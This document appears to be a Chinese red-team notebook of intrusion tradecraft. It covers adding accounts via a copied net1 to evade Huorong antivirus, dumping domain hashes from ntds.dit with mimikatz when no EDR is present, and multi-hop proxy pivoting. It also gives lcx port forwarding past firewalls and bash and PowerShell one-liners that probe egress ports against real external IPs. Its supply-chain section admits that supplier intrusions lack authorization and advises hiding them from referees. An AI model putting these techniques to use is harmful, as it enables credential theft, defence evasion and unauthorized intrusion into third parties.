<a name="1Om89"></a>
# 
<a name="zx8ld"></a>
## 查看更改后的RDP端口
如何查看被改后3389的端口<br />执行命令 tasklist /svc | find "Ter"，本例中查看到 TermService 的 PID 是 1592。<br />执行命令 netstat -ano | find "1592"，查看 TermService 使用的端口，如示例中的 3389。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893159-1fd1ed3e-2d52-4f12-b962-8b8970006029.png#align=left&display=inline&height=85&originHeight=162&originWidth=788&status=done&style=none&width=415)
<a name="WSrOd"></a>
## Copy net1添加账户绕火绒
![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893413-9f39a1aa-53d6-424a-85c8-134587ac3359.png#align=left&display=inline&height=362&originHeight=852&originWidth=802&status=done&style=none&width=341)
<a name="lfzK6"></a>
## 供应链攻击
供应链攻击分享笔记：1、供应商提供的信息可能适合定位靶标位置和获取靶标权限。2、怎么找供应商？<br />（1）招投标网站查询靶标信息或者目标单位信息，确定系统建设方。<br />（2）靶标或者目标单位，网站最底部，一般有“xxxx公司提供技术支持”。<br />（3）有些官网自带招投标信息。3、一些供应商提供固定行业的系统建设，一套代码多处使用，所以可能存在口令复用问题。4、思路之一：尝试找生产系统的测试系统，测试系统一般是供应商搞的，可能存在数据库数据复用问题。5、搞供应商内网的邮箱(运维\IT\驻场)、论坛、OA是重点，这些敏感信息多。6、忠告：不推荐大家，看一个攻击目标就只想着供应链。供应链只是一种可能存在的攻击途径，主要是辅助我们对目标进行渗透。而且在搞供应链的时候一定要有目的性，寻找网络连通的可能性，而不是乱打一气。毕竟在证明网络可连通之前，是没有授权的，公安没法保你的。7、保护自己：没拿到靶标相关的东西前，先不要和裁判说入侵了xx供应商，注意隐蔽自己，即使在供应商那里没找到有用信息，就当无事发生。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400893836-e1c373b0-0c49-495b-8cd4-10ccfd635e01.png#align=left&display=inline&height=189&originHeight=592&originWidth=1098&status=done&style=none&width=350)
<a name="ccvja"></a>
## 
<a name="4kwxW"></a>
## Proxifier(代理技巧以及多层代理)
代理整个C段<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611400894424-cc5bb1db-3171-476e-aee0-4dff3a66f3c6.png#align=left&display=inline&height=351&originHeight=523&originWidth=619&status=done&style=none&width=415)

多级代理<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611654971644-158e02e5-1ceb-4130-b5b1-88911c465438.png#align=left&display=inline&height=442&originHeight=589&originWidth=592&size=147443&status=done&style=none&width=444)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611655001700-67999aae-3bc9-491f-afcb-eb2a72773a54.png#align=left&display=inline&height=287&originHeight=382&originWidth=352&size=173281&status=done&style=none&width=264)<br />[https://mp.weixin.qq.com/s/Wjv6dULS6Wwyg4N8-ZmHng](https://mp.weixin.qq.com/s/Wjv6dULS6Wwyg4N8-ZmHng)

--------------------------------------------------------------------------------<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629406269-f85bbcc5-a9d7-4243-a6c9-16542bdf66f1.png#align=left&display=inline&height=335&originHeight=446&originWidth=903&size=186269&status=done&style=none&width=677)<br />1中出网，和vps服务器作上代理，这个时候，攻击机器可以访问2<br />2不出网，可以继续建立多层代理。让攻击机访问到3<br />添加如下代理链<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629438953-d37fab86-ff58-4559-9ceb-6a3fb0b117c6.png#align=left&display=inline&height=454&originHeight=605&originWidth=581&size=99933&status=done&style=none&width=436)<br />这个时候，会多出一个chain就能走上代理了。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629555289-de6f9eaa-9880-4376-95ac-bcfcfdd6b17e.png#align=left&display=inline&height=236&originHeight=315&originWidth=757&size=16614&status=done&style=none&width=568)

linux的话，需要修改一下proxychain<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615629627077-673b51d4-9cde-4abb-afbb-d065bfe3ab1c.png#align=left&display=inline&height=332&originHeight=443&originWidth=484&size=100868&status=done&style=none&width=363)


<a name="6EHu3"></a>
## 关于EDR

域控就是域管理员，但是域控似乎不存在本地管理员<br /> <br />ntds.dit(域控环境)是为了可以获取域内所有的hash值  ，获取域内所有的hash值就有域内所有用户的登陆hash或者邮箱hash<br />ntds.dit拉到本地，然后本地抓起来，  如果电脑没有深信服edr啥的,mimikatz可以直接本地抓<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611461765647-f9a72f9e-d523-4d7f-9b6f-b82378253661.png#align=left&display=inline&height=319&originHeight=425&originWidth=780&size=109556&status=done&style=none&width=585)

<a name="EnMEs"></a>
## 关于NC的报错
nc -lvp <br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614229953887-cefa8a24-e103-4567-8bd2-6d79d5327a2e.png#align=left&display=inline&height=67&originHeight=89&originWidth=549&size=5278&status=done&style=none&width=412)<br />如果有这个报错，直接加个n就可以<br />nc -lnvp
<a name="xmb3p"></a>
## 关于内网3389
有时候内网没有3389，但是cs上线了，权限也很高，命令行开启了内网3389端口的时候，netstat都看到了3389，就是还是连不上，或者说内网某些网段做了限制策略不允许访问。这个时候可以选择一下端口转发。<br />例如:<br />条件:3389防火墙做了限制无法访问，转到53端口。<br />lcx.exe -tran 53 192.168.222.137 3389

<a name="fcJcK"></a>
## 不出网的情况，使用出网的端口上线CS，或者做代理
**防火墙的出站规则:是指管理员允许电脑能访问外网服务器的什么端口。也可以是电脑哪些端口可以访问外网。**<br />**![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615613315611-4e13b54f-e0bb-4f72-afc1-0b24aa082ada.png#align=left&display=inline&height=342&originHeight=683&originWidth=910&size=62482&status=done&style=none&width=455)**<br />入口webshell的机子不出网，不出网分几种情况<br />1：协议出网，比如:icmp ping不通百度，curl不通http，但是dns可以解析<br />2: 端口出网<br />linux命令下，使用下面命令探测端口出网。
```
for i in {21,22,23,25,53，80,88,110,137,138,139,123,143,389,443,445,161,1521,3306,3389,6379,7001,7002,8000,8001,8080,8090,9000,9090,11211};do timeout 0.5 bash -c "echo >/dev/tcp/101.36.104.49/$i" && echo "$i ************************open************************" || echo "$i closed";done
```
windows命令下
```
powershell -c "21,22,80,137,161,443,445,1900,3306,3389,5353,8080 | %{try {(new-object Net.Sockets.TcpClient).Connect('106.55.62.131',$_);Write-Host "$_ open"} catch {Write-Host "$_ closed"} finally {} }"|findstr /I open
```
这个时候，即使协议不出网，但是tcp通信还在的话，找到出网端口进行socks代理，或者上线CS也是没问题的

<a name="QN4YO"></a>
## 内网渗透快速定位域控
进入内网后，直接快速扫88、389、445端口的特征。serverscan会比较好用。

Microsoft-DS traffic: 445/TCP、445/UDP<br />Kerberos: 88/TCP、 88/UDP<br />LDAP ping: 389/UDP <br />DNS: 53/TCP、53/UDP<br />计算机登录与验证身份时会用到的连接端口<br />计算机登录到域控制器时会用到以下的服务，因此如果域的成员计算机与域控制之间被防火墙隔开，就必须在防火墙开放这些服务的连接端口。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615620444239-a02bb77a-92ad-48c8-bdaa-b0b3066b4658.png#align=left&display=inline&height=276&originHeight=552&originWidth=798&size=31400&status=done&style=none&width=399)
